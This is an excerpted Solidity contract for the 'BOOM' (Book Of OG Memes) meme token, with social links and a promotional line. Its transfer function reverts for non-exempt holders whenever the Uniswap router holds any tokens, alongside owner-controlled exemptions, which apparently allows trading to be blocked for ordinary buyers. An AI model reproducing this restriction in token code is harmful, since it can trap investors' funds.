...
https://x.com/BookOfOGMemesX
https://t.me/BOOKOFOGMEME

Internet lore, eternal culture.
The Book of OG Memes tells the story. 
$BOOM.
...
contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "1BOOM");
        require(recipient != address(0), "2BOOM");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "3BOOM");
    ...
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "4BOOM");
        require(spender != address(0), "5BOOM");
...
contract BOOM is ERC20 {
    ...
    constructor(address router) ERC20("Book Of OG Memes", "BOOM", TOTAL_SUSUPPLYS) {
    ...
    function _transfer(address from, address to, uint256 amount) internal override {
        require(from != address(0), "6BOOM");
        require(to != address(0), "7BOOM");
        _checkLimitation(from, to, amount);
        if (amount == 0) {
            return;
        }
        if (!isException[from] && !isException[to]) {
            require(balanceOf(address(uniswapV2Router)) == 0, "8BOOM");
        }
    ...
    function _checkLimitation(address from, address to, uint256 amount) internal {
        if (!hasLimit_) {
            if (!isException[from] && !isException[to]) {
                require(amount <= maxTxAmountbesomes, "9BOOM");
                ...
                require(balanceOf(to) + amount <= maxwalletssetsomes, "0BOOM");
            }
        }
    }
}